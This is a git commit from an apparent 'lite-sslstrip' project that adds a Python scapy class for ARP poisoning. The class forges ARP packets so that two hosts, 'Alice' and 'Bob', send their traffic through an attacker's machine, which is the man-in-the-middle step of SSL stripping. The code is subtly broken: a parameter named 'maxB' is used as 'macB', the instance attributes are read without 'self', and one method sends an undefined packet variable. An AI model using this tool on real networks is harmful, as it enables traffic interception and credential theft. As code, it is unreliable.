87463a4387537da0a560648d3eb5627a8d8b7df9
Unknown <tim.houthuijs@hotmail.com>
2018-03-16 12:40:04 +0100

    ArpPoison class added
    This class send one packet each time, so no automatic sending

---
+++ lite-sslstrip/arppoison.py
@@ -0,0 +1,33 @@
+from scapy.all import *
+
+class ArpPoison:
+
+    def __init__(self, macA, ipA, maxB, ipB, macM, ipM):
+        self.macA = macA
+        self.ipA = ipA
+        self.macB = macB
+        self.ipB = ipB
+        self.macM = macM
+        self.ipM = ipM
+
+    # create ARP poison of Alice machine
+    def arpPoisonA(self):
+        arpA = Ether() / ARP()
+        arpA[Ether].src = macM
+        arpA[ARP].hwsrc = macM
+        arpA[ARP].psrc = ipB
+        arpA[ARP].hwdst = macA
+        arpA[ARP].pdst = ipA
+        sendp(arpA)
+        print "ARP packet send to Alice"
+
+    # create ARP poison of Bobs machine
+    def arpPoisonB(self):
+        arpA = Ether() / ARP()
+        arpA[Ether].src = macM
+        arpA[ARP].hwsrc = macM
+        arpA[ARP].psrc = ipA
+        arpA[ARP].hwdst = macB
+        arpA[ARP].pdst = ipB
+        sendp(arpB)
+        print "ARP packet send to Bob"
